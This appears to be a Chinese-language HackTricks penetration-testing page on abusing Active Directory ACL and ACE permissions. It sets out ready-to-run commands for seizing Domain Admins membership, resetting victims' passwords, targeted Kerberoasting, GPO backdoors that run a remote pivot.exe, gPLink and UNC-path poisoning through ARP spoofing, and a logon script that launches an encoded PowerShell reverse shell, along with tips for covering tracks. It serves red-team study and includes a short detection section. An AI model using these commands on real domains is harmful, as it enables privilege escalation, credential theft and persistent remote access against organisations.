# 滥用 Active Directory ACL/ACE

{{#include ../../../banners/hacktricks-training.md}}

**本页面主要总结了以下文章中的技术：** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **以及** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**。如需更多详细信息，请查看原文。**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **用户上的 GenericAll 权限**

此权限授予攻击者对目标用户账户的完全控制权。使用 `Get-ObjectAcl` 命令确认 `GenericAll` 权限后，攻击者可以：

- **更改目标用户的密码**：使用 `net user <username> <password> /domain`，攻击者可以重置该用户的密码。
- 在 Linux 中，可以通过 Samba `net rpc` 使用 SAMR 执行相同操作：<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **如果帐户已禁用，请清除 UAC 标志**：`GenericAll` 允许编辑 `userAccountControl`。在 Linux 中，BloodyAD 可以移除 `ACCOUNTDISABLE` 标志：<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**：为用户账户分配 SPN，使其可进行 Kerberoasting，然后使用 Rubeus 和 targetedKerberoast.py 提取并尝试破解票据授予票据（TGT）哈希。
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**：禁用用户的预身份验证，使其帐户容易受到 ASREPRoasting 攻击。
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**：拥有用户的 `GenericAll` 权限后，可以添加基于证书的凭据，并在不更改其密码的情况下以该用户身份进行身份验证。参见：

{{#ref}}
shadow-credentials.md
{{#endref}}

## **组上的 GenericAll 权限**

如果攻击者对 `Domain Admins` 等组拥有 `GenericAll` 权限，则可以操纵组成员身份。使用 `Get-NetGroup` 识别该组的可分辨名称后，攻击者可以：

- **将自己添加到 Domain Admins 组**：可以通过直接命令或使用 Active Directory、PowerSploit 等模块完成。
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- 在 Linux 中，当你对任意组拥有 GenericAll/Write 成员权限时，也可以利用 BloodyAD 将自己添加到这些组中。如果目标组嵌套在“Remote Management Users”中，你将立即获得对遵循该组配置的主机的 WinRM 访问权限：<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

在计算机对象或用户账户上拥有这些权限，可实现：

- **Kerberos Resource-based Constrained Delegation**：启用对计算机对象的接管。
- **Shadow Credentials**：利用创建 shadow credentials 的权限，通过冒充计算机或用户账户来使用此技术。

## **WriteProperty on Group**

如果用户对某个特定组（例如 `Domain Admins`）的所有对象拥有 `WriteProperty` 权限，则可以：

- **Add Themselves to the Domain Admins Group**：通过组合使用 `net user` 和 `Add-NetGroupUser` 命令实现，从而在域内进行权限提升。
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self（Self-Membership）on Group**

此权限允许攻击者将自己添加到特定组（例如 `Domain Admins`）中，方法是通过命令直接操纵组成员身份。使用以下命令序列即可将自己添加到该组：
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

类似的权限允许攻击者在对组拥有 `WriteProperty` 权限时，通过修改组属性直接将自己添加到组中。该权限的确认和执行方式如下：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

在用户对象上持有 `User-Force-Change-Password` 的 `ExtendedRight`，即可在不知道当前密码的情况下重置密码。可以通过 PowerShell 或其他命令行工具验证并利用此权限，提供多种重置用户密码的方法，包括交互式会话以及适用于非交互环境的单行命令。这些命令涵盖简单的 PowerShell 调用，以及在 Linux 上使用 `rpcclient`，展示了攻击向量的多样性。
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **组上的 WriteOwner**

如果攻击者发现自己对某个组拥有 `WriteOwner` 权限，就可以将该组的所有权更改为自己。这在目标组为 `Domain Admins` 时影响尤其严重，因为更改所有权后，可以更广泛地控制组属性和成员关系。该过程包括使用 `Get-ObjectAcl` 识别正确的对象，然后使用 `Set-DomainObjectOwner` 通过 SID 或名称修改所有者。
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

此权限允许攻击者修改用户属性。具体而言，通过 `GenericWrite` 访问权限，攻击者可以更改用户的登录脚本路径，以便在用户登录时执行恶意脚本。可以使用 `Set-ADObject` 命令，将目标用户的 `scriptpath` 属性更新为指向攻击者的脚本。
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

利用此权限，攻击者可以操纵组成员关系，例如将自己或其他用户添加到特定组中。此过程包括创建凭据对象，使用该对象向组中添加或移除用户，并通过 PowerShell 命令验证成员关系的变化。
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- 在 Linux 中，当你对组拥有 `GenericWrite` 权限时，Samba `net` 可以添加/删除成员（在无法使用 PowerShell/RSAT 时很有用）：<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

拥有 AD 对象并具备该对象的 `WriteDACL` 权限，可以让攻击者授予自己对该对象的 `GenericAll` 权限。通过 ADSI 操作即可实现这一点，从而完全控制该对象并修改其组成员关系。不过，尝试使用 Active Directory 模块的 `Set-Acl` / `Get-Acl` cmdlet 利用这些权限时仍存在限制。<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner 快速接管（PowerView）

当你对某个用户或 service account 拥有 `WriteOwner` 和 `WriteDacl` 权限时，可以使用 PowerView 完全控制该账户，并在不知道旧密码的情况下重置其密码：
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notes:
- 如果你只有 `WriteOwner` 权限，可能需要先将所有者更改为自己：
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- 使用任意协议（SMB/LDAP/RDP/WinRM）在密码重置后验证访问权限。

## **Replication on the Domain (DCSync)**

DCSync attack 利用域上的特定 replication permissions 来模拟 Domain Controller 并同步数据，包括用户凭据。这项强大的 technique 需要 `DS-Replication-Get-Changes` 等 permissions，使攻击者无需直接访问 Domain Controller 即可从 AD 环境中提取敏感信息。<sup>[[5]](#references)</sup> [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

被委派管理 Group Policy Objects (GPOs) 的访问权限可能带来严重的安全风险。例如，如果用户 `offense\spotless` 被委派了 GPO 管理权限，则可能拥有 **WriteProperty**、**WriteDacl** 和 **WriteOwner** 等 privileges。这些 permissions 可被滥用于恶意目的，可使用 PowerView 识别：`bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

要识别配置错误的 GPOs，可以将 PowerSploit 的 cmdlets 链接起来。这可以发现特定用户有权限管理的 GPOs：`powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**应用了给定 Policy 的 Computers**：可以解析特定 GPO 所应用的 Computers，从而帮助了解潜在影响的范围。`powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**应用于给定 Computer 的 Policies**：可以使用 `Get-DomainGPO` 等 commands 查看特定 Computer 应用了哪些 Policies。

**应用了给定 Policy 的 OUs**：可以使用 `Get-DomainOU` 识别受给定 Policy 影响的 organizational units (OUs)。

你还可以使用 [**GPOHound**](https://github.com/cogiceo/GPOHound) 枚举 GPOs 并查找其中的问题。

### Abuse GPO - New-GPOImmediateTask

配置错误的 GPOs 可被利用来执行 code，例如创建 immediate scheduled task。这样可以将用户添加到受影响 Machines 的 local administrators group，从而显著提升 privileges：
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - 滥用 GPO

如果已安装 GroupPolicy module，则可以创建并链接新的 GPO，并设置注册表值等首选项，以便在受影响的计算机上执行后门。此方法要求更新 GPO，并且用户登录计算机后才能执行：
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - 滥用 GPO

SharpGPOAbuse 提供了一种滥用现有 GPO 的方法：通过添加任务或修改设置，无需创建新的 GPO。此工具要求先修改现有 GPO，或使用 RSAT 工具创建新的 GPO，然后再应用更改：
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 强制更新策略

GPO 更新通常每隔约 90 分钟执行一次。为了加快此过程，尤其是在实施更改之后，可以在目标计算机上使用 `gpupdate /force` 命令强制立即更新策略。该命令可确保对 GPO 的任何修改都会被应用，而无需等待下一次自动更新周期。

### 工作原理

检查给定 GPO（例如 `Misconfigured Policy`）的 Scheduled Tasks 后，可以确认其中添加了 `evilTask` 等任务。这些任务通过脚本或命令行工具创建，目的是修改系统行为或提升权限。

`New-GPOImmediateTask` 生成的 XML 配置文件展示了任务的结构，其中包括要执行的命令及其触发器。该文件体现了如何在 GPO 中定义和管理 Scheduled Tasks，并提供了一种在策略强制执行过程中执行任意命令或脚本的方法。

### Users and Groups

GPO 还允许操纵目标系统上的用户和组成员关系。通过直接编辑 Users and Groups 策略文件，攻击者可以将用户添加到特权组，例如本地 `administrators` 组。这可以通过委派 GPO 管理权限实现，从而允许修改策略文件、添加新用户或更改组成员关系。

Users and Groups 的 XML 配置文件说明了如何实现这些更改。通过向该文件添加条目，可以向受影响的系统授予特定用户提升后的权限。这种方法通过操纵 GPO 提供了直接的权限提升途径。

此外，还可以考虑其他用于执行代码或维持持久性的方式，例如利用登录/注销脚本、修改用于自动运行的注册表键、通过 .msi 文件安装软件，或编辑服务配置。这些技术通过滥用 GPO，为维持访问权限及控制目标系统提供了多种途径。

### 将 GPC/GPT 检索重定向到经过身份验证的 rogue services

一个 GPO 由包含元数据的 LDAP **Group Policy Container (GPC)** 和包含策略文件、托管于 SMB 的 **Group Policy Template (GPT)** 组成。在刷新期间，客户端遵循容器的 `gPLink`，读取所引用的 GPC 及其 `gPCFileSysPath`，然后从该 UNC 路径下载 GPT。因此，对 GPC 本身或 OU、Site 或 Domain 的 `gPLink` 具有写入权限，都可以被转化为特权策略处理。<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### 使用 GPOddity 进行 `gPCFileSysPath` poisoning

如果受控主体能够写入目标 GPC（直接写入或通过 **NTLM relay to LDAP**），则可将 `gPCFileSysPath` 替换为由攻击者托管的 UNC 路径。[GPOddity](https://github.com/synacktiv/GPOddity) 可自动执行 LDAP 更改，并提供包含基于模块的策略文件或 Immediate Task 的恶意 GPT，Group Policy 客户端会以 `NT AUTHORITY\SYSTEM` 身份执行该 GPT。<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

在当前 Windows 客户端上，匿名或不依赖凭据的 SMB share 并不足够：SMB Secure Negotiate 要求证明身份验证已成功，因此 rogue service 必须验证域身份、派生 SMB session key，并正确签署其响应。在 embedded mode 中，使用受控 machine account 及其 service key 配置 GPOddity，然后在 `[COMMANDS]` 部分选择 computer-side 或 user-side payload。<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**User GPO edge case：**在 MS16-072 之后，Windows 仍会在**同一个 TCP 连接**中创建两个 SMB2 会话：用户会话读取 `GPT.INI`，随后计算机帐户会话读取 `ScheduledTasks.xml` 等有效配置。因此，恶意服务器必须按 SMB2 `SessionId`（而不仅是 socket）索引 authentication state、session keys 和 signing keys。嵌入 GPOddity/OUned 的 Scapy fork 通过 `SMBStreamSocketMultiplexing` 和支持 multiplexing 的 `SMBServer` 实现了这一点；否则，单会话 Impacket/Scapy 服务器会复用错误的 signing state，并在处理用户策略时失败。<sup>[[15]](#references)</sup>

#### `gPLink` poisoning with OUned

借助 `WriteGPLink`、`GenericWrite` 或对 OU、Site 或 Domain 的等效控制，攻击者可以追加一个链接，使其 GPC DN 由攻击者控制的 LDAP 主机提供。Petros Koutroumpis 最初介绍了这一 primitive；[OUned](https://github.com/synacktiv/OUned) 可自动化 LDAP 写入以及恶意 GPC/GPT chain。<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
受害者首先向 rogue LDAP 服务进行身份验证，并接收一个 `gPCFileSysPath` 指向 rogue SMB 服务的 GPC；随后，它向 SMB 进行身份验证并应用所提供的 GPT。因此，OUned 需要一个具有 LDAP SPN 的账户、一个具有用于 SMB 的 HOST SPN 的机器账户（同一个机器账户可以同时满足两者），以及能够将端口 389 和 445 转发到操作者主机的 DNS 解析或反向转发。<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
OUned 的内置 Scapy LDAP server 使用真实的受控 service key 验证 Kerberos/SPNEGO，并从 JSON 提供任意 GPC 数据。空 JSON key 用于模拟 rootDSE，`base64:` 前缀表示二进制值；该 server 支持 add/delete/modify/search，以及 `BASE`、`LEVEL` 和 `SUBTREE` searches；它可以协商无保护、完整性保护或机密性保护。这样，当其他 Windows 组件遵循 attacker-controlled LDAP reference，但又要求经过认证的 LDAP 时，该 service 便可重复使用。<sup>[[15]](#references)</sup>

不要假设将 account password 同步到 dummy domain 就能重现所有 Kerberos key：RC4 从 password 派生，而 AES string-to-key 还会使用从 principal 的 hostname/domain 派生的 salt。向 `KerberosSSP` 提供实际的 account AES key，可以避免通过对 machine account 自身可写的 `msDS-SupportedEncryptionTypes` 进行可检测的修改来强制使用 RC4。<sup>[[15]](#references)</sup>

#### Detection pivots

将 `gPCFileSysPath` 或 `gPLink` 的变更与 GPO version 变更以及新的 Immediate/Scheduled Task XML 进行关联。调查指向异常 naming contexts 的 links、批准的 DC/SYSVOL 集合之外的 UNC hosts、将 machine-account names 重定向的 DNS records、异常 machine accounts 的 LDAP/CIFS service tickets，以及启用 RC4 的 `msDS-SupportedEncryptionTypes` 变更。<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

通过 OU/domain 使用 `WriteGPLink`，可以修改目标 container 的 `gPLink` attribute，并**强制已有 GPO 应用**，而无需编辑 GPO 本身。当已链接的 GPO 已经通过 **UNC paths**（`\\HOST\share\...`）引用远程内容时，这一点很有价值，因为经过认证的 users 可以读取 **SYSVOL**，并 offline 搜索可复用的 policies。<sup>[[11]](#references)</sup>

High-level workflow：

1. 使用 BloodHound 识别一个对 OU 拥有 `WriteGPLink` 的 principal，并枚举该 OU 内的 computers/users。
2. 以只读方式 clone `SYSVOL`，并解析 GPO，查找引用 UNC paths 的 **Software Installation**、**drive mappings**（`Drives.xml`）以及 **logon/startup scripts**。
3. 优先选择指向**直接 hostname** 的 policies（例如 `\\DC02\share\pkg.msi`），而不是 DFS/domain-namespace paths，因为基于 hostname 的 paths 更容易通过 L2 spoofing 进行重定向。
4. 将选定的 GPO GUID 附加到目标 OU 的 `gPLink`，使 victim 处理该已有 policy。
5. 在同一 broadcast domain 上对 UNC host 进行 ARP spoof，并在本地绑定其 IP（`ip addr add <target_ip>/32 dev <iface>`），使 victim 的 SMB traffic 到达你的 host。
6. 使用 attacker SMB server（例如 `smbserver.py`）提供预期的 path/filename，然后等待正常的 policy processing。

`SYSVOL` collection 和 GPO correlation 示例：
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
将现有 GPO 链接到目标 OU：
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

如果链接的 GPO 从 UNC 路径部署 MSI，客户端会在**计算机启动**期间获取该文件，并以 **`NT AUTHORITY\SYSTEM`** 身份安装。通过 spoof 被引用的主机，并在**相同的共享/路径/名称**下提供恶意 MSI，你可以将 `WriteGPLink` 转化为 SYSTEM code execution，**无需修改 SYSVOL**。

重要限制：

- **时机很重要**：新链接会在策略刷新时被发现（通常约每 90 分钟一次），但 **Software Installation** 通常会在**重启**时触发。
- Windows Installer 通常使用包的 **`ProductCode`** 跟踪部署。如果产品已经安装，部署可能会被跳过。
- 为避免安装程序拒绝，修改 rogue MSI，使其 **`ProductCode`** 和 **`PackageCode`** 与 GPO 所需的合法包一致。
- 旧的 `.aas` 广告文件可能仍保留在 `SYSVOL` 中，因此在依赖该部署前，请确认其仍显示为 active。
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` 中的 GPP drive mappings 会导致用户在登录或重新连接时向配置的 UNC 路径进行身份验证。如果 spoof 被引用的主机，就可以捕获 **NetNTLMv2**。如果故意让 SMB 失败，Windows 可能会通过 **WebDAV** 重试，并发送 **NTLM over HTTP**，这对于向 **LDAP(S)**、**AD CS** 或 **SMB** 进行 relay 灵活得多。

#### Logon/startup script UNC hijack

同样的模式也适用于在 `SYSVOL` 中发现的 UNC-hosted scripts：

- **Logon scripts** 通常在 **user** context 中执行。
- **Startup scripts** 通常在 **computer / SYSTEM** context 中执行。

如果 script path 指向一个可 spoof 的 hostname，就重定向 UNC host，并从预期位置提供替换的 script content。

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` 或 `\\<dc>\NETLOGON\` 下的可写路径允许篡改通过 GPO 在用户登录时执行的 logon scripts。这会在登录用户的 security context 中实现 code execution。

### Locate logon scripts
- 检查用户 attributes 中是否配置了 logon script：
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- 遍历 domain shares，以发现指向脚本的快捷方式或引用：
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- 解析 `.lnk` 文件以解析指向 SYSVOL/NETLOGON 的目标（对 DFIR 技巧以及没有直接 GPO access 的攻击者很有用）：
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound 在存在 `logonScript`（scriptPath）属性时，会在用户节点上显示该属性。

### 验证写入权限（不要信任共享列表）
自动化工具可能会将 SYSVOL/NETLOGON 显示为只读，但底层 NTFS ACL 仍可能允许写入。务必进行测试：
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
如果文件大小或 mtime 发生变化，则表示你拥有写入权限。修改前请保留原始文件。

### 为 RCE 投毒 VBScript 登录脚本
追加一条启动 PowerShell reverse shell 的命令（从 revshells.com 生成），并保留原有逻辑，以避免破坏业务功能：
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
在你的主机上监听，并等待下一次交互式登录：
```bash
rlwrap -cAr nc -lnvp 443
```
注意：
- 执行会在 logging user 的 token 下进行（而不是 SYSTEM）。作用范围是应用该脚本的 GPO link（OU、site、domain）。
- 使用后通过恢复原始内容/时间戳进行清理。


## References

- [1] [滥用 Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [特权账户和 Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL Attack Path 更新](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [使用 ACLs 在 Active Directory 中提升权限](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [扫描 Active Directory Privileges 和 Privileged Accounts](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – 来自 Linux 的 AD attribute/UAC 操作](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc（group membership）](https://www.samba.org/)
- [10] [HTB Puppy：AD ACL abuse、KeePassXC Argon2 cracking 以及通过 DPAPI decryption 获取 DC admin 权限](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out：劫持 GPO UNC Paths 以执行代码和进行 NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity：通过 NTLM relaying 等方式利用 Active Directory GPOs](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py：利用 Active Directory 中隐藏的 Organizational Units ACL attack vectors](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [在 network 上模拟合法的 Active Directory services：GPO exploitation 案例](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
